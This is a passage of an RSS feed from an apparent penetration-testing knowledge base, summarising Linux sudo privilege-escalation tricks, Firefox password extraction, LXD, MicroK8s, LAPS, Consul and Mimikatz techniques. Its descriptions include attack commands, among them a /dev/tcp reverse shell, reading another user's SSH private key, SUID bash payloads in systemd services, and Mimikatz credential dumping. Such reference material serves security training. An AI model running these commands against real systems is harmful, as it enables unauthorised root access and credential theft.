      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASSWD: /usr/sbin/reboot If we can execute &amp;ldquo;reboot&amp;rdquo; command as root, we can escalate to privileges.&#xA;Exploitation link1. Find Service Config Files Which Are Writable linkWe need to look for the system service config file which are writable.&#xA;find / -writable -name &amp;#34;*.service&amp;#34; 2&amp;gt;/dev/null /etc/systemd/system/example.service 2. Insert a Payload linkIf we find a writable file, we can inject a payload into Service.ExecStart.&#xA;# /etc/systemd/systm/example.service [Unit] Description=Zeno monitoring [Service] Type=simple User=root ExecStart=/bin/bash -c &amp;#39;cp /bin/bash /home/&amp;lt;username&amp;gt;/bash; chmod &amp;#43;xs /home/&amp;lt;username&amp;gt;/bash&amp;#39; [Install] WantedBy=multi-user.</description>
    </item>
    <item>
      <title>Sudo Screen Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) /usr/bin/screen -r testsession If we can execute &amp;ldquo;screen&amp;rdquo; command as root, we can spawn a root shell from the screen session.&#xA;Exploitation linkFirst execute &amp;ldquo;screen&amp;rdquo; command as root, then a screen session will be start.&#xA;Now we can spawn a root shell by pressing “Ctrl+a+c” in the screen session.</description>
    </item>
    <item>
      <title>Sudo Shutdown, Poweroff Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASS: /usr/sbin/shutdown If we can execute &amp;ldquo;shutdown&amp;rdquo; command as root, we can gain access to privileges by overwriting the path of &amp;ldquo;poweroff&amp;rdquo;.&#xA;Exploitation linkFirst create /tmp/poweroff binary which invoke a shell.&#xA;echo /bin/sh &amp;gt; /tmp/poweroff # or echo /bin/bash &amp;gt; /tmp/poweroff Then change permissions of the file and add &amp;quot;/tmp&amp;quot; folder to PATH.&#xA;chmod &amp;#43;x /tmp/poweroff export PATH=/tmp:$PATH Now execute &amp;ldquo;shutdown&amp;rdquo; as root.&#xA;# Some SUID command sudo /usr/sbin/shutdown # Then you are root user root&amp;gt; /tmp/poweroff is executed and spawn a root shell.</description>
    </item>
    <item>
      <title>Sudo Vim Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASSWD: vim example.txt If we can execute &amp;ldquo;vim&amp;rdquo; command as root, we can execute the shell command in the vim editor.&#xA;Exploitation linkSimply run &amp;ldquo;vim&amp;rdquo; command as root.&#xA;sudo vim example.txt In Vim editor, we can run shell commands as root.&#xA;:r!whoami </description>
    </item>
    <item>
      <title>Sudo Wall Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASSWD: wall Exploitation link # Reverse shell sudo wall &amp;#34;$(bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;)&amp;#34; # Gets a SSH private key of another user sudo wall &amp;#34;$(cat /home/user/.ssh/id_rsa)&amp;#34; </description>
    </item>
    <item>
      <title>Sudo Wget Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) NOPASSWD: /usr/bin/wget If we can execute &amp;ldquo;wget&amp;rdquo; as root, we may be able to escalate privileges.&#xA;Modify /etc/shadow linkGet &amp;quot;/etc/shadow&amp;quot; and generate a new hash passwd, then set it to the shadow file, next upload it.&#xA;That changes the root password.&#xA;1. Get the Content of /etc/shadow linkTo see the content of /etc/shadow, we can use netcat listener.&#xA;So First, start a listener in local machine.</description>
    </item>
    <item>
      <title>Mozilla Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</link>
      <pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</guid>
      <description>Extract Passwords from Firefox Profile link1. Transfer the .firefox Directory link Zip&#xA;First, zip .firefox directory in target machine, and open web server to transfer the zip file to local machine.&#xA;zip -r /tmp/firefox.zip .firefox cd /tmp python3 -m http.server 8000 In local machine, download the zip file from the remote machine, and decompress it.&#xA;wget http://&amp;lt;target-ip&amp;gt;:8000/mozilla.zip unzip mozilla.zip Tar&#xA;If we cannot use zip, tar also can be used.</description>
    </item>
    <item>
      <title>LXC/LXD (Linux Container/Daemon) Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/</link>
      <pubDate>Mon, 30 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/</guid>
      <description>Basic Flow link Check if You are in the Lxd Group&#xA;If you belong to the Lxd group, you may be able to the root privileges.&#xA;groups id Check if Container Image Exists&#xA;List all images and check if a container image already exists.&#xA;lxc image list If there are not container, build a new image in your local machine.&#xA;git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder sudo ./build-alpine python3 -m http.server 8000 In remote machine, download the “alpine-*.</description>
    </item>
    <item>
      <title>MicroK8s Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/container/kubernetes/microk8s-pentesting/</link>
      <pubDate>Sat, 28 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/container/kubernetes/microk8s-pentesting/</guid>
      <description>Ports and Services link Port 10250 - kubelet Port 10255 - kubelet (read only) Port 10257 - kube-controller Port 10259 - kube-scheduler Port 16443 - API server Port 25000 - cluster-agent Port 32000 - Docker registry Docker Registry (port 32000) linkIt is the same as Docker Registry Pentesting .&#xA;Investigation from Inside link # Version snap info microk8s Privilege Escalation (CVE-2019-15789) ≤ 1.15.2 linkSee the post for details.&#xA;1. Create a Pod Yaml File linkReplace the value of spec.</description>
    </item>
    <item>
      <title>LAPS (Local Administrator Password Solution) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/laps-pentesting/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/laps-pentesting/</guid>
      <description>Enumeration link msfconsole use post/windows/gather/credentials/enum_laps set session 2 exploit Obtain Administrator&amp;rsquo;s Password linkFirst, check if you are in the LAPS_Readers group.&#xA;net user &amp;lt;current-username&amp;gt; # Global Group memberships *LAPS_Readers Using Get-ADComputer linkGet-ADComputer gets the information of the Active Directory computer.&#xA;Get-ADComputer -Identity &amp;#39;&amp;lt;active-directory-computer-name&amp;gt;&amp;#39; -property &amp;#39;ms-mcs-admpwd&amp;#39; Using Get-LAPSPasswords.ps1 link Download the Payload in Local Machine&#xA;If you are in LAPS_Readers, you can get the administrator&amp;rsquo;s password using Get-LAPSPasswords.ps1{:target=&amp;quot;_blank&amp;quot;}{:rel=&amp;ldquo;noopener&amp;rdquo;}.&#xA;wget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1 Transfer the Payload to Target Machine</description>
    </item>
    <item>
      <title>HashiCorp Consul Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</link>
      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</guid>
      <description>Privilege Escalation linkIf you have the ACL token (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx), you may be able to privilege escalation.&#xA;First, create a script which changes the permission of ‘bash’.&#xA;echo &amp;#39;chmod &amp;#43;s /usr/bin/bash&amp;#39; &amp;gt; /tmp/exploit.sh Then curl.&#xA;curl --header &amp;#34;X-Consul-Token: &amp;lt;ACL-TOKEN&amp;gt;&amp;#34; --request PUT -d &amp;#39;{&amp;#34;ID&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Address&amp;#34;: &amp;#34;127.0.0.1&amp;#34;, &amp;#34;Port&amp;#34;: 80, &amp;#34;check&amp;#34;: {&amp;#34;Args&amp;#34;: [&amp;#34;/usr/bin/bash&amp;#34;, &amp;#34;/tmp/e.sh&amp;#34;], &amp;#34;interval&amp;#34;: &amp;#34;10s&amp;#34;, &amp;#34;timeout&amp;#34;: &amp;#34;1s&amp;#34;}}&amp;#39; http://127.0.0.1:8500/v1/agent/service/register KV (Key/Value) Store link # Put consul kv put --token &amp;lt;ACL-TOKEN&amp;gt; key value consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 path/to/store data </description>
    </item>
    <item>
      <title>Mimikatz</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/mimikatz/</link>
      <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/mimikatz/</guid>
      <description>You can download it from the GitHub repository.&#xA;Usage link mimikatz Check if Mimikatz Running as an Administrator&#xA;mimikatz # privilege::debug Elevate to SYSTEM Level&#xA;mimikatz # token::elevate Dump Hashes&#xA;mimikatz # lsadump::lsa /patch Security Identifier of the Kerberos Ticket Granting Ticket Account&#xA;mimikatz # lsadump::lsa /inject /name:krbtgt All SAM Local Password Hashes&#xA;mimikatz # lsadump::sam Credentials from the LSASS Memory&#xA;mimikatz # sekurlsa::logonpasswords Create a Kerberos Golden Ticket&#xA;mimikatz # kerberos::golden /user:Administrator /domain:sample.</description>
    </item>
  </channel>
</rss>
